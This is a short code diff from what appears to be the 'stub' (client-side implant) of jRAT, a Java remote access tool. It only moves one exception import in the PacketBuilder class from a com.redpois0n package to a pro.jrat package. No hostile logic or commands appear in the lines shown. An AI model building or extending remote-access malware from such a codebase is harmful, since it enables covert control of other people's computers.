@@ -3,10 +3,10 @@ package pro.jrat.stub.packets.incoming;
 import java.util.ArrayList;
 import java.util.List;
 
+import pro.jrat.common.exceptions.PacketAlreadySentException;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.OutgoingHeader;
 
-import com.redpois0n.common.exceptions.PacketAlreadySentException;
 
 public class PacketBuilder {
 
